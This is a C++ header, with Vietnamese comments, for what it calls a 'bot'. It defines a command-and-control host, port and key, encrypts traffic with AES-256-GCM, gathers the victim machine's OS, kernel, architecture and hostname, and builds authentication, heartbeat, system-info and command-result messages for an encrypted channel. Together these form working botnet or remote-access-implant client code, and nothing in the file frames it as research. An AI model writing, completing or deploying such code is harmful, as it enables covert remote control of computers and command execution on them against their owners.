// common.h — Shared header cho bot: protocol struct, crypto, system info, logging
#pragma once

#include <arpa/inet.h>
#include <cstring>
#include <ctime>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <openssl/sha.h>
#include <string>
#include <sys/utsname.h>
#include <unistd.h>
#include <vector>

// ── Compile-time config (injected via -D flags) ──────────
#ifndef CNC_HOST
#define CNC_HOST "127.0.0.1"
#endif
#ifndef CNC_PORT
#define CNC_PORT 8443
#endif
#ifndef CNC_KEY
#define CNC_KEY "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef"
#endif

// ── Constants ────────────────────────────────────────────
constexpr int HEARTBEAT_INTERVAL = 30;
constexpr int RECONNECT_BASE_DELAY = 1;
constexpr int RECONNECT_MAX_DELAY = 300;
constexpr int CMD_TIMEOUT = 60;

// ── Logging ──────────────────────────────────────────────
#ifndef NDEBUG
#include <cstdio>
#define LOG_ERROR(fmt, ...) std::fprintf(stderr, "[ERROR] " fmt "\n", ##__VA_ARGS__)
#else
#define LOG_ERROR(fmt, ...) ((void)0)
#endif

// ── AES-256-GCM Crypto ───────────────────────────────────
class AesGcm {
    std::vector<unsigned char> key_;

public:
    explicit AesGcm(const std::string& key_hex) {
        key_.resize(32);
        for (size_t i = 0; i < 32; ++i) {
            unsigned int byte;
            std::sscanf(key_hex.c_str() + i * 2, "%2x", &byte);
            key_[i] = static_cast<unsigned char>(byte);
        }
    }

    std::vector<unsigned char> encrypt(const unsigned char* plaintext, size_t len) const {
        std::vector<unsigned char> iv(12);
        RAND_bytes(iv.data(), 12);

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        std::vector<unsigned char> ciphertext(len + 16);
        int out_len = 0, final_len = 0;

        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr);
        EVP_EncryptInit_ex(ctx, nullptr, nullptr, key_.data(), iv.data());
        EVP_EncryptUpdate(ctx, ciphertext.data(), &out_len, plaintext, static_cast<int>(len));
        EVP_EncryptFinal_ex(ctx, ciphertext.data() + out_len, &final_len);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, 16, ciphertext.data() + out_len + final_len);
        EVP_CIPHER_CTX_free(ctx);

        ciphertext.resize(out_len + final_len + 16);

        // Prepend IV
        std::vector<unsigned char> result;
        result.insert(result.end(), iv.begin(), iv.end());
        result.insert(result.end(), ciphertext.begin(), ciphertext.end());
        return result;
    }

    std::vector<unsigned char> decrypt(const unsigned char* data, size_t len) const {
        if (len < 28) return {};

        const unsigned char* iv = data;
        const unsigned char* ct = data + 12;
        size_t ct_len = len - 12 - 16;
        const unsigned char* tag = data + len - 16;

        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
        if (!ctx) return {};

        std::vector<unsigned char> plaintext(ct_len + 16);
        int out_len = 0, final_len = 0;

        EVP_DecryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, 12, nullptr);
        EVP_DecryptInit_ex(ctx, nullptr, nullptr, key_.data(), iv);
        EVP_DecryptUpdate(ctx, plaintext.data(), &out_len, ct, static_cast<int>(ct_len));
        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_TAG, 16, (void*)tag);

        int ret = EVP_DecryptFinal_ex(ctx, plaintext.data() + out_len, &final_len);
        EVP_CIPHER_CTX_free(ctx);

        if (ret <= 0) return {};
        plaintext.resize(out_len + final_len);
        return plaintext;
    }
};

// ── System Info ──────────────────────────────────────────
inline std::string get_os_name() { return "Linux"; }

inline std::string get_os_version() {
    FILE* f = popen("cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | cut -d= -f2 | tr -d '\"'", "r");
    if (!f) return "";
    char buf[256]{};
    fread(buf, 1, sizeof(buf) - 1, f);
    pclose(f);
    std::string s(buf);
    while (!s.empty() && (s.back() == '\n' || s.back() == '\r')) s.pop_back();
    return s;
}

inline std::string get_arch() {
    utsname u{};
    uname(&u);
    return u.machine;
}

inline std::string get_kernel() {
    utsname u{};
    uname(&u);
    return u.release;
}

inline std::string get_hostname() {
    char buf[256]{};
    gethostname(buf, sizeof(buf));
    return buf;
}

// ── Minimal JSON Builder ─────────────────────────────────
inline std::string json_escape(const std::string& s) {
    std::string out;
    for (char c : s) {
        if (c == '"') out += "\\\"";
        else if (c == '\\') out += "\\\\";
        else if (c == '\n') out += "\\n";
        else out += c;
    }
    return out;
}

inline std::string build_auth_msg(const std::string& bot_id, const std::string& key_hash) {
    char nonce[33];
    unsigned char rnd[16];
    RAND_bytes(rnd, 16);
    for (int i = 0; i < 16; ++i) std::snprintf(nonce + i * 2, 3, "%02x", rnd[i]);

    char buf[2048];
    std::snprintf(buf, sizeof(buf),
        R"({"type":"auth","id":"%s","timestamp":%ld,"nonce":"%s","data":{"bot_id":"%s","key_hash":"%s"}})",
        std::to_string(time(nullptr) ^ *(uint64_t*)rnd).c_str(),
        (long)time(nullptr),
        nonce,
        json_escape(bot_id).c_str(),
        json_escape(key_hash).c_str());
    return buf;
}

inline std::string build_info_msg(const std::string& os_name, const std::string& os_version,
                                   const std::string& arch, const std::string& kernel,
                                   const std::string& hostname) {
    char nonce[33];
    unsigned char rnd[16];
    RAND_bytes(rnd, 16);
    for (int i = 0; i < 16; ++i) std::snprintf(nonce + i * 2, 3, "%02x", rnd[i]);

    char buf[2048];
    std::snprintf(buf, sizeof(buf),
        R"({"type":"info","id":"%s","timestamp":%ld,"nonce":"%s","data":{"os":"%s","os_version":"%s","arch":"%s","kernel":"%s","hostname":"%s"}})",
        std::to_string(time(nullptr) ^ *(uint64_t*)rnd).c_str(),
        (long)time(nullptr),
        nonce,
        json_escape(os_name).c_str(),
        json_escape(os_version).c_str(),
        json_escape(arch).c_str(),
        json_escape(kernel).c_str(),
        json_escape(hostname).c_str());
    return buf;
}

inline std::string build_heartbeat_msg() {
    char nonce[33];
    unsigned char rnd[16];
    RAND_bytes(rnd, 16);
    for (int i = 0; i < 16; ++i) std::snprintf(nonce + i * 2, 3, "%02x", rnd[i]);

    char buf[512];
    std::snprintf(buf, sizeof(buf),
        R"({"type":"heartbeat","id":"%s","timestamp":%ld,"nonce":"%s","data":{}})",
        std::to_string(time(nullptr) ^ *(uint64_t*)rnd).c_str(),
        (long)time(nullptr),
        nonce);
    return buf;
}

inline std::string build_result_msg(const std::string& cmd_id, const std::string& output, int exit_code) {
    char nonce[33];
    unsigned char rnd[16];
    RAND_bytes(rnd, 16);
    for (int i = 0; i < 16; ++i) std::snprintf(nonce + i * 2, 3, "%02x", rnd[i]);

    char buf[16384];
    std::snprintf(buf, sizeof(buf),
        R"({"type":"result","id":"%s","timestamp":%ld,"nonce":"%s","data":{"cmd_id":"%s","output":"%s","exit_code":%d}})",
        std::to_string(time(nullptr) ^ *(uint64_t*)rnd).c_str(),
        (long)time(nullptr),
        nonce,
        json_escape(cmd_id).c_str(),
        json_escape(output).c_str(),
        exit_code);
    return buf;
}

// ── Minimal JSON Parser ──────────────────────────────────
// Chỉ parse các field cần thiết, không cần full JSON parser
inline std::string json_get_string(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":\"";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "";
    pos += search.length();
    std::string val;
    while (pos < json.size() && json[pos] != '"') {
        if (json[pos] == '\\' && pos + 1 < json.size()) {
            pos++;
            if (json[pos] == 'n') val += '\n';
            else if (json[pos] == 't') val += '\t';
            else val += json[pos];
        } else {
            val += json[pos];
        }
        pos++;
    }
    return val;
}

inline int json_get_int(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return 0;
    pos += search.length();
    return std::atoi(json.c_str() + pos);
}

inline std::string json_get_obj(const std::string& json, const std::string& key) {
    std::string search = "\"" + key + "\":{";
    size_t pos = json.find(search);
    if (pos == std::string::npos) return "{}";
    pos += search.length() - 1;
    int depth = 0;
    size_t start = pos;
    while (pos < json.size()) {
        if (json[pos] == '{') depth++;
        else if (json[pos] == '}') { depth--; if (depth == 0) return json.substr(start, pos - start + 1); }
        pos++;
    }
    return "{}";
}

// ── Wire Format (framing) ────────────────────────────────
inline bool send_message(int sock, const std::string& json, const AesGcm& crypto) {
    auto encrypted = crypto.encrypt((const unsigned char*)json.data(), json.size());
    uint32_t len = htonl(static_cast<uint32_t>(encrypted.size()));
    if (send(sock, &len, 4, MSG_NOSIGNAL) != 4) return false;
    if (send(sock, encrypted.data(), encrypted.size(), MSG_NOSIGNAL) != (ssize_t)encrypted.size()) return false;
    return true;
}

inline std::string recv_message(int sock, const AesGcm& crypto) {
    uint32_t len_be;
    if (recv(sock, &len_be, 4, MSG_WAITALL) != 4) return "";
    uint32_t len = ntohl(len_be);
    if (len > 1000000) return "";

    std::vector<unsigned char> encrypted(len);
    size_t total = 0;
    while (total < len) {
        ssize_t n = recv(sock, encrypted.data() + total, len - total, 0);
        if (n <= 0) return "";
        total += n;
    }

    auto plain = crypto.decrypt(encrypted.data(), encrypted.size());
    return std::string(plain.begin(), plain.end());
}

inline std::string sha256_hex(const std::string& input) {
    unsigned char hash[SHA256_DIGEST_LENGTH];
    SHA256((const unsigned char*)input.data(), input.size(), hash);
    char hex[SHA256_DIGEST_LENGTH * 2 + 1];
    for (int i = 0; i < SHA256_DIGEST_LENGTH; ++i)
        std::snprintf(hex + i * 2, 3, "%02x", hash[i]);
    return hex;
}
